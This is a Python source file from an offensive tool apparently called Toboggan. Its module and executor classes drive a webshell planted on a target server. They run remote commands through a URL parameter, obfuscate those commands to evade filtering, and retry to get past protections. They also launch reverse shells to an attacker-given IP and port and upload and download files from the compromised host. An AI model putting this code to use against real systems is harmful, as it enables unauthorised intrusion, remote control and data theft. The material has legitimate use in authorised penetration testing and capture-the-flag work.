# Built-in imports
import base64
import gzip
import inspect
import random
import time
import types
from pathlib import Path
from typing import TYPE_CHECKING
import socket

# Third party library imports
import httpx

# Type checking
if TYPE_CHECKING:
    from toboggan.src import operating_systems

CURRENT_PATH = Path(__file__).resolve().parent

BUILT_IN_MODULES_DIR = CURRENT_PATH.parent / "modules"
DEFAULT_MODULE = BUILT_IN_MODULES_DIR / "webshell.py"


class Module:
    def __init__(
        self,
        module_path: str = None,
        url: str = None,
        request_parameters: dict = None,
        command_parameter: str = "cmd",
        burp_proxy: bool = False,
    ) -> None:
        self.__module_path = module_path or "webshell"
        self.__url = url
        self.__request_parameters = request_parameters
        self.__command_parameter = command_parameter
        self.__burp_proxy = burp_proxy

        self.__load_module()

    # Public methods

    # Private methods
    def __configure_webshell_module(self, module_code: str) -> str:
        """
        Configures the webshell module with the provided URL and request parameters.

        Args:
            module_code (str): The module code as a string.

        Returns:
            str: The configured module code with URL and parameters substituted.
        """
        if not self.__url:
            raise ValueError(
                "[Toboggan] No URL provided. Cannot configure the webshell module."
            )

        # Replace the ||URL|| placeholder
        module_code = module_code.replace("||URL||", self.__url)
        module_code = module_code.replace("||PARAM_CMD||", self.__command_parameter)

        # Format the parameters into a dictionary string
        params = ", ".join(
            [
                f'"{key}": "{value}"'
                for key, value in (self.__request_parameters or {}).items()
            ]
        )

        # Replace the ||PARAMS|| placeholder
        module_code = module_code.replace("# ||PARAMS||", params)

        # print(module_code)

        return module_code

    def __load_module(self) -> None:
        """
        Dynamically loads a module, either a built-in or specified by the user, and verifies the 'execute' method's signature.

        This method first determines whether the module is built-in or user-specified based on the provided module path.
        If the module is built-in, it configures the module based on the provided URL for webshell modules.
        If the module is user-specified, it validates the file and loads it.
        Regardless of the source, it applies Burp Proxy configuration if enabled and verifies that the 'execute' method exists and contains the required parameters 'command' and 'timeout'.

        Raises:
            ValueError: If no URL is provided for a webshell module.
            FileNotFoundError: If the specified module file does not exist.
            TypeError: If the specified file is not a Python module, the module does not contain a callable 'execute' method, or the 'execute' method does not contain the required parameters.
        """
        module_code = ""
        module_name = self.__module_path

        # Check for built-in module
        built_in_module_path = Path(BUILT_IN_MODULES_DIR) / (self.__module_path + ".py")
        if built_in_module_path.exists():
            print(f"[Toboggan] Using built-in module {module_name}.")
            module_code = built_in_module_path.read_text(encoding="utf-8")

            if self.__module_path.startswith("webshell"):
                if self.__url is None:
                    raise ValueError(
                        "[Toboggan] No url provided. Cannot handle the webshell."
                    )

                module_code = self.__configure_webshell_module(module_code)

        else:
            # Handling external module path
            print(
                f"[Toboggan] Searching for provided module path: '{self.__module_path}'."
            )
            module_path_obj = Path(self.__module_path)
            if not module_path_obj.exists():
                raise FileNotFoundError(
                    f"The specified file {module_name} does not exist."
                )
            if module_path_obj.suffix != ".py":
                raise TypeError("The specified file is not a Python module 🐍.")
            module_code = module_path_obj.read_text(encoding="utf-8")
            module_name = module_path_obj.stem

        # Apply Burp Proxy configuration
        if self.__burp_proxy:
            print("[Toboggan] All requests will be transmitted through Burp proxy.")
            if module_name == "snippet":
                module_code = module_code.replace("if False", "if True")
            else:
                if "# ||BURP||" not in module_code:
                    print("[Toboggan] '# ||BURP||' placeholder not found.")
                else:
                    module_code = module_code.replace(
                        "# ||BURP||",
                        'proxies={"http://": "http://127.0.0.1:8080", "https://": "http://127.0.0.1:8080"},',
                    )

        # Load the module
        current_module = types.ModuleType(name=module_name)
        exec(module_code, current_module.__dict__)

        if not hasattr(current_module, "execute") or not callable(
            getattr(current_module, "execute")
        ):
            raise TypeError(
                f"The module {module_name} does not contain a callable 'execute' method."
            )

        required_params = ["command", "timeout"]

        # Check if required parameters are present in the 'execute' method
        if not all(
            param in inspect.signature(current_module.execute).parameters
            for param in required_params
        ):
            raise TypeError(
                f"The 'execute' method in {module_name} does not have the expected parameters: {', '.join(required_params)}."
            )

        self.__module = current_module
        print(f"[Toboggan] Module {module_name} loaded 💾.")

    # Properties
    @property
    def module(self):
        return self.__module


class Executor:
    """Executor class for handling module execution."""

    # Since files are generally read byte-by-byte, chunk_size is in bytes.
    CHUNK_SIZE = 2 << 10

    def __init__(self, module: "Module") -> None:
        """
        Initializes the Executor class with a specified module.

        Args:
            module (Module): An instance of the Module class to be executed.

        Note:
            The executor uses a default chunk size for file actions.
        """

        self.__obfuscation = True

        self.__module = module.module

        self.__os_handler = None

        self.__chunk_size = Executor.CHUNK_SIZE
        print(
            f"[Toboggan] Default chunk size for file action is {self.__chunk_size} bytes."
        )

    # Public methods
    def remote_execute(
        self, command: str, timeout: float = None, retry: bool = True
    ) -> str:
        """Executes the specified command within the module.

        Args:
            command (str): Command to be executed within the module.

        Returns:
            str: Result of the executed command within the module, if successful.
        """

        result = ""

        if self.__os_handler is not None and self.__obfuscation:
            command = self.__os_handler.prepare_command(command)

            # print(f"|-> {command}")

        for attempt in range(5):
            try:
                result = self.__module.execute(command=command, timeout=timeout)
            except Exception as error:
                print(f"[Toboggan] Exception occured: {error}")
                if "414 Request-URI" in str(error):
                    break

                if "302" in str(error):
                    break

                if not retry:
                    return

                # Sometimes, load balancers and protections can make requests
                # succeed every other time.
                # Let's implement an exponential backoff with jitter
                sleep_time = (2**attempt) + (random.randint(0, 1000) / 1000)

                print(f"[Toboggan] Sleeping for {sleep_time} seconds.")
                time.sleep(sleep_time)
                continue
            else:
                break

        if "403 Forbidden" in result:
            raise ConnectionError("403 Forbidden")

        if self.__obfuscation and self.__os_handler and result:
            try:
                result = self.__os_handler.unobfuscate_result(result)
            except ValueError:
                print(
                    f"[Toboggan] Unobfuscation of the received output failed.\n\t• Command: {command!r}\n\t• Result: {result!r}"
                )
                raise

        return result

    def one_shot_execute(self, command: str = None) -> None:
        """Execute a command without returning nothing and with a fast timeout.

        Args:
            command (str): Command to be executed.
        """
        if not command:
            return

        try:
            if self.__os_handler is not None and self.__obfuscation:
                command = self.__os_handler.prepare_command(command=command)
            self.__module.execute(command=command, timeout=1.5)
        except Exception:
            return

    def is_alive(self) -> bool:
        """
        Check if the target module is reachable and operational by executing a command.

        This method attempts to run an empty command on the target module with a specified timeout.
        If the module responds within the timeout, it is considered 'alive', and the response time is printed.
        If an error occurs during the execution or the module doesn't respond, it is considered 'not alive'.

        Returns:
            bool: True if the target module is reachable and operational, False otherwise.
        """
        start_time = time.time()

        try:
            self.remote_execute(command="", timeout=5)
        except Exception as error:
            print("[Toboggan] Impossible to reach the target 🎯.")
            print(f"[Toboggan] Root cause: {error}")
            return False
        else:
            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            print(f"[Toboggan] Target is reachable in {response_time:.2f} ms 🎯.")
            return True

    def os_guessing(self) -> str:
        """
        Guesses the operating system by analyzing the output of the `PATH` command.

        This method sends the `PATH` command to the target system and examines the response
        to determine the operating system type. It uses specific output patterns to distinguish
        between Windows and Unix-like environments. The detection relies on identifying error messages
        specific to PowerShell (indicative of Windows) or the presence of a Windows system path in the output.
        If neither Windows-specific condition is detected, the method defaults to identifying the system as Unix-like.

        Returns:
            str: A string indicating the detected operating system ('windows' or 'unix').
                'windows' is returned if the output suggests a PowerShell or CMD environment.
                'unix' is returned if the output does not match Windows-specific patterns.
        """
        result = self.__module.execute(command="PATH")

        print(f"[Toboggan] Guessing OS with output: {result}")

        if "not recognized as the name of a cmdlet" in result:
            print("[Toboggan] Detected PowerShell behavior; assuming Windows OS 🖥️.")
            return "windows"

        if r"C:\Windows\system32;" in result:
            print("[Toboggan] Detected DOS behavior; assuming Windows OS 🖥️.")
            return "windows"

        print("[Toboggan] Assuming Unix-like OS 🖥️.")
        return "unix"

    def set_os(self, os_handler: "operating_systems.OSHandler") -> None:
        self.__os_handler = os_handler
        self.__os_handler.fetch_initial_details()

    def reverse_shell(
        self, ip_addr: str = None, port: int = None, shell: str = None
    ) -> None:
        if ip_addr is None:
            print(
                "[Toboggan] An IP address is required to launch a revshell. Here are yours:"
            )
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as chaussette:
                chaussette.connect(("92.93.94.95", 1))
                local_ip = chaussette.getsockname()[0]

            print(f"\t> Local IP: {local_ip}")
            print(f"\t> Public IP: {httpx.get('https://ident.me').text}")
            return

        print(f"[Toboggan] Launching a reverse shell ({shell}) to {ip_addr}:{port} 🕊️.")
        self.__os_handler.reverse_shell(ip_addr, port, shell)

    def determine_best_chunk_size(self) -> None:
        """
        Determine the optimal chunk size for sending data to the target using a dichotomic search.

        This method seeks to identify the largest possible chunk size (between 1 KiB and 1 MiB)
        that can be sent to the target without causing an error or receiving no response. The
        search utilizes a dichotomic or binary search approach to efficiently find the best chunk size.

        The process involves sending an increasing size of 'junk data' combined with a real command ('hostname')
        to the target and observing the response. If a response is received, it implies the chunk size is acceptable,
        and the search space is adjusted accordingly. If an error occurs or no response is received, the chunk size
        is reduced.

        Warning:
            This method can be noisy, potentially causing multiple error messages or disruptions on the target system.
            Use with caution.

        Attributes modified:
            self.__chunk_size: This will be set to the determined optimal chunk size at the end of the function.
        """
        min_chunk_size = 1024  # 1 KiB
        max_chunk_size = 2 << 19  # 1 MiB
        last_successful_chunk_size = min_chunk_size

        print(
            f"[Toboggan] Searching for best chunk size using dichotomy between 1 KiB to 1 MiB ... 🧮"
        )

        while min_chunk_size <= max_chunk_size and (
            max_chunk_size - min_chunk_size > 1024
        ):
            test_chunk_size = (min_chunk_size + max_chunk_size) // 2
            junk_data = "hostname;" + "j" * test_chunk_size

            try:
                result = self.__module.execute(
                    command=junk_data, timeout=5, retry=False
                ).strip()

                if result:
                    last_successful_chunk_size = test_chunk_size
                    min_chunk_size = test_chunk_size + 1
                else:
                    max_chunk_size = test_chunk_size - 1
            except Exception:
                max_chunk_size = test_chunk_size - 1

        # Once loop finishes, set the optimal chunk size to the last successful one
        self.__chunk_size = last_successful_chunk_size

        print(f"[Toboggan] Determined chunk size: {self.__chunk_size} bytes.")

    def upload_file(
        self, file_content: bytes, remote_path: str, chunk_size: int = None
    ) -> None:
        print(f"[Toboggan] Uploading to remote path {remote_path!r} 📤.")
        self.__os_handler.upload_file(
            file_content, remote_path, chunk_size or self.__chunk_size
        )

    def download_file(
        self, remote_path: str, local_path: str, chunk_size: int = None
    ) -> None:
        """
        Downloads a file from the remote shell.

        Args:
            remote_path (str): The remote path to the file.
            local_path (str): The local path to the file.

        Returns:
            None
        """
        encoded_file = self.__os_handler.get_encoded_file(
            remote_path=remote_path, chunk_size=chunk_size or self.__chunk_size
        )
        if not encoded_file:
            print(f"[Toboggan] Failed to download '{remote_path}'")
            return

        # Write the decompressed content to the local file
        Path(local_path).write_bytes(
            data=gzip.decompress(base64.b64decode(encoded_file))
        )

        print(
            f"[Toboggan] Downloaded file from remote {remote_path!r} to local {local_path!r} 📥."
        )

    # Private methods
    # Properties
    @property
    def obfuscation(self) -> bool:
        return self.__obfuscation

    @obfuscation.setter
    def obfuscation(self, needed: bool) -> None:
        self.__obfuscation = needed

    @property
    def user(self) -> str:
        return self.__os_handler.user

    @property
    def hostname(self) -> str:
        return self.__os_handler.hostname

    @property
    def pwd(self) -> str:
        return self.__os_handler.pwd

    @property
    def system_info(self) -> str:
        return self.__os_handler.system_info
